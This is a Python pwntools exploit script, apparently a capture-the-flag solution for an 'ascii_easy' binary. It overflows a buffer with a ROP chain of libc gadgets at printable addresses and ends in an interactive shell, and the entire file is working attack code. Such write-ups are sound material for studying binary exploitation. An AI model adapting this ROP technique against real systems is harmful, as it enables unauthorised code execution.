from pwn import *

context(arch="i386", os="linux", log_level="debug")

libc_base = 0x5555e000
libc_gadget = 0x6667f
nullptr_ptr = 0x556b7e50


gadget = libc_base + libc_gadget

pop_edx_xor_eax_pop_edi = 0x00095555 + libc_base
pop_esi_ebp_ebx = 0x0014572d + libc_base
xor_edx_ebp = 0x000d564b + libc_base
add_esi_ebx = 0x0006812c + libc_base
sub_eax_edi_pop_esi_edi_ebp = 0x00067c5d + libc_base
mov_ref_eax_edx = 0x00078225 + libc_base
inc_edx = 0x000e4d7a + libc_base
add_ebx_esi = 0x00187554 + libc_base

fill = p32(0x66666666)

payload = b"a" * 0x1c + fill
payload += p32(pop_edx_xor_eax_pop_edi) + p32(nullptr_ptr) + fill
payload += p32(pop_esi_ebp_ebx) + p32(0x202f7020) + p32(0x20402020) + p32(0x65706040)
payload += p32(xor_edx_ebp)
payload += p32(add_esi_ebx) * 2
payload += p32(sub_eax_edi_pop_esi_edi_ebp) + fill * 3
payload += p32(mov_ref_eax_edx)
payload += p32(inc_edx) * 4
payload += p32(pop_esi_ebp_ebx) + p32(0x2020205a) + p32(0x25304f20) + p32(0x5020207a)
payload += p32(add_ebx_esi)
payload += p32(xor_edx_ebp)
payload += p32(gadget)

pro = process(["./ascii_easy", payload])
#pro = gdb.debug(["./ascii_easy", payload], gdbscript="b *0x08048530", api=True)
pro.interactive()
